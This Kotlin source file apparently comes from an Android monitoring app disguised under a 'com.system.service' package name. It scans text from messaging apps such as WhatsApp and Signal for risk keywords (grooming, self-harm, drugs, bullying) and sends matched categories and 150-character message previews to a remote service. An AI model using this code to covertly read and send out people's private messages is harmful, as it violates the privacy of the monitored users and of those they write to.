package com.system.service.monitors

import android.content.Context
import com.system.service.core.CoreService
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.ConcurrentHashMap

object SocialDetector {

    private const val PREFS   = "social_detector"
    private const val KEY_ON  = "enabled"

    @Volatile var enabled = false

    val SOCIAL_PKGS = setOf(
        "com.whatsapp", "com.whatsapp.w4b",
        "org.telegram.messenger", "org.telegram.plus",
        "com.instagram.android",
        "com.snapchat.android",
        "com.facebook.orca",      // Messenger
        "com.facebook.katana",    // Facebook
        "com.discord",
        "com.twitter.android",    // X/Twitter
        "org.thoughtcrime.securesms", // Signal
        "com.tiktok.android",
        "com.zhiliaoapp.musically" // TikTok alt pkg
    )

    data class RiskCategory(val name: String, val keywords: List<String>, val severity: String)

    private val RISK_CATEGORIES = listOf(
        RiskCategory("violence",  listOf("kill", "murder", "hurt", "beat", "attack", "fight me",
            "i'll hurt", "going to kill", "stab"), "HIGH"),
        RiskCategory("drugs",     listOf("weed", "cocaine", "heroin", "meth", "mdma", "pills", "drug",
            "smoke weed", "get high", "dealer"), "HIGH"),
        RiskCategory("adult",     listOf("sex", "porn", "nude", "nudes", "naked", "xxx",
            "send photos", "only fans"), "HIGH"),
        RiskCategory("bullying",  listOf("ugly", "loser", "nobody likes you", "kill yourself", "kys",
            "stupid", "worthless", "no one cares", "hate you", "freak"), "MEDIUM"),
        RiskCategory("grooming",  listOf("meet alone", "don't tell", "our secret", "how old are you",
            "send pic", "video call alone", "don't tell parents"), "HIGH"),
        RiskCategory("self_harm", listOf("cut myself", "end it", "don't want to live",
            "suicide", "not worth it", "want to die"), "HIGH")
    )

    private val lastAlertTime = ConcurrentHashMap<String, Long>()
    private const val COOLDOWN_MS = 60_000L

    fun init(context: Context) {
        enabled = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .getBoolean(KEY_ON, false)
    }

    fun setEnabled(on: Boolean, context: Context) {
        enabled = on
        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit().putBoolean(KEY_ON, on).apply()
    }

    fun analyze(text: String, pkg: String) {
        if (!enabled || text.isBlank() || !SOCIAL_PKGS.contains(pkg)) return
        val lower = text.lowercase()
        for (cat in RISK_CATEGORIES) {
            val matched = cat.keywords.firstOrNull { lower.contains(it) } ?: continue
            val key = "$pkg:${cat.name}:$matched"
            val now = System.currentTimeMillis()
            if (now - (lastAlertTime[key] ?: 0L) < COOLDOWN_MS) continue
            lastAlertTime[key] = now

            CoreService.instance?.sendData("social_detect", JSONObject().apply {
                put("package",  pkg)
                put("app",      appName(pkg))
                put("category", cat.name)
                put("severity", cat.severity)
                put("keyword",  matched)
                put("preview",  redactSensitive(text.take(150)))
                put("time",     now)
            })
        }
    }

    private fun appName(pkg: String) = when (pkg) {
        "com.whatsapp", "com.whatsapp.w4b" -> "WhatsApp"
        "org.telegram.messenger", "org.telegram.plus" -> "Telegram"
        "com.instagram.android"  -> "Instagram"
        "com.snapchat.android"   -> "Snapchat"
        "com.facebook.orca"      -> "Messenger"
        "com.facebook.katana"    -> "Facebook"
        "com.discord"            -> "Discord"
        "com.twitter.android"    -> "X (Twitter)"
        "org.thoughtcrime.securesms" -> "Signal"
        "com.tiktok.android","com.zhiliaoapp.musically" -> "TikTok"
        else -> pkg.substringAfterLast('.')
    }

    private fun redactSensitive(text: String): String {
        return text.replace(Regex("[0-9]{10,}"), "***")
                   .replace(Regex("\\b[A-Za-z0-9._%+\\-]+@[A-Za-z0-9.\\-]+\\.[A-Za-z]{2,}\\b"), "***")
    }

    fun getCategories(): JSONArray {
        val arr = JSONArray()
        RISK_CATEGORIES.forEach { cat ->
            arr.put(JSONObject().apply {
                put("name",     cat.name)
                put("severity", cat.severity)
                put("count",    cat.keywords.size)
            })
        }
        return arr
    }
}
